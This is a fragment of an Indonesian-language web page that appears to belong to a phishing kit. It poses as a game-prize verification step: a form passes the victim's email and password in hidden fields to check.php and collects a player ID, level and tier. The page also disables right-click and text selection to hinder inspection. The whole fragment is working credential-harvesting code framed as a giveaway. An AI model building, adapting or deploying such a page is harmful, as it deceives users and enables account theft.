...
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    ...
    <div class="notification-container">
        <div class="notification">
            ...
            <div style="padding-top: 10px; color: #000; font-size: 20px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase;">VERIFIKASI DATA KAMU AGAR HADIAH BISA DIPROSES </div>
        </div>
    </div>
        ...
        margin-top: 5px;
                ...
                <section class="container" id="js-lotto">
                  <form action="check.php" method="post">
                    <input type="hidden" name="mail" id="mail" value="<?php echo $email;?>" readonly="">
                    <input type="hidden" name="password" id="password" value="<?php echo $password;?>" readonly="">
					<input type="number" style="background: #fed33f; width: 100%; height: auto; padding: 10px; color: #000; font-size: 17px; font-weight: bold; font-family:Teko; text-align: left; border: 2px solid #000; outline: none;" name="playid" id="playid" placeholder="PLAYER ID" autofocus="" autocomplete="off" required="">
                        <select style="background: #fed33f; width: 100%; height: auto; padding: 10px; color: #000; font-size: 17px; font-weight: bold; font-family:Teko; text-align: left; border: 2px solid #000; outline: none;" name="level" id="level" required="">
                        ...
                        <select style="background: #fed33f; width: 100%; height: auto; padding: 10px; color: #000; font-size: 17px; font-weight: bold; font-family:Teko; text-align: left; border: 2px solid #000; outline: none;" name="tier" id="tier" required="">
                        ...
                        <select style="background: #fed33f; width: 100%; height: auto; padding: 10px; color: #000; font-size: 17px; font-weight: bold; font-family:Teko; text-align: left; border: 2px solid #000; outline: none;" name="rpt" id="rpt" required="">
                        ...
                        <button type="submit" style="background: #fed33f; width: 45%; height: auto; margin-left: auto; margin-right: auto; padding: 9px; color: #000; font-size: 25px; font-weight: bold; font-family: Teko; text-align: center; text-transform: uppercase; border: 2px solid #000; outline: none; display: block;">VERIFIKASI</button>
                  </form>
                </section>
            </div>
        </div>
